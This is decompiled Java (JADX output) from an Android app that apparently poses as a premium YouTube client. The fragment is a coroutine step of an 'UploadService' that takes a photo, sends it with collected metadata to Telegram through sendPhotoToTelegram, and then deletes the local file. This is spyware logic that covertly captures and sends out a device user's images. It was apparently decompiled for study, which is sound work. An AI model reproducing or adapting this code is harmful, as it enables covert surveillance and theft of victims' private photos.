package com.w8sb.w8premiumyt;

import java.io.File;
import kotlin.Metadata;
import kotlin.ResultKt;
import kotlin.Unit;
import kotlin.coroutines.Continuation;
import kotlin.coroutines.intrinsics.IntrinsicsKt;
import kotlin.coroutines.jvm.internal.DebugMetadata;
import kotlin.coroutines.jvm.internal.SuspendLambda;
import kotlin.jvm.functions.Function2;
import kotlin.jvm.internal.Intrinsics;
import kotlinx.coroutines.CoroutineScope;

/* JADX INFO: compiled from: UploadService.kt */
/* JADX INFO: loaded from: /storage/emulated/0/Android/data/com.dastanapps.androiddevtools/files/decompiled/com.yt.phantombabar/dex/classes3.dex */
@Metadata(d1 = {"\u0000\n\n\u0002\u0018\u0002\n\u0002\u0010\u0002\n\u0000\u0010\u0002\u001a\u00020\u0001*\u00020\u0000H\u008a@"}, d2 = {"Lkotlinx/coroutines/CoroutineScope;", "", "<anonymous>"}, k = 3, mv = {1, 8, 0})
@DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService$takeAndSendPhoto$3$1", f = "UploadService.kt", i = {}, l = {2271}, m = "invokeSuspend", n = {}, s = {})
final class UploadService$takeAndSendPhoto$3$1 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
    final /* synthetic */ File $file;
    final /* synthetic */ StringBuilder $meta;
    int label;
    final /* synthetic */ UploadService this$0;

    /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
    UploadService$takeAndSendPhoto$3$1(UploadService uploadService, File file, StringBuilder sb, Continuation<? super UploadService$takeAndSendPhoto$3$1> continuation) {
        super(2, continuation);
        this.this$0 = uploadService;
        this.$file = file;
        this.$meta = sb;
    }

    public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
        return new UploadService$takeAndSendPhoto$3$1(this.this$0, this.$file, this.$meta, continuation);
    }

    public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
        return create(coroutineScope, continuation).invokeSuspend(Unit.INSTANCE);
    }

    public final Object invokeSuspend(Object $result) {
        UploadService$takeAndSendPhoto$3$1 uploadService$takeAndSendPhoto$3$1;
        Object coroutine_suspended = IntrinsicsKt.getCOROUTINE_SUSPENDED();
        switch (this.label) {
            case 0:
                ResultKt.throwOnFailure($result);
                UploadService uploadService = this.this$0;
                File file = this.$file;
                String string = this.$meta.toString();
                Intrinsics.checkNotNullExpressionValue(string, "meta.toString()");
                this.label = 1;
                if (UploadService.access$sendPhotoToTelegram(uploadService, file, string, (Continuation) this) == coroutine_suspended) {
                    return coroutine_suspended;
                }
                uploadService$takeAndSendPhoto$3$1 = this;
                break;
                break;
            case 1:
                uploadService$takeAndSendPhoto$3$1 = this;
                ResultKt.throwOnFailure($result);
                break;
            default:
                throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
        }
        uploadService$takeAndSendPhoto$3$1.$file.delete();
        return Unit.INSTANCE;
    }
}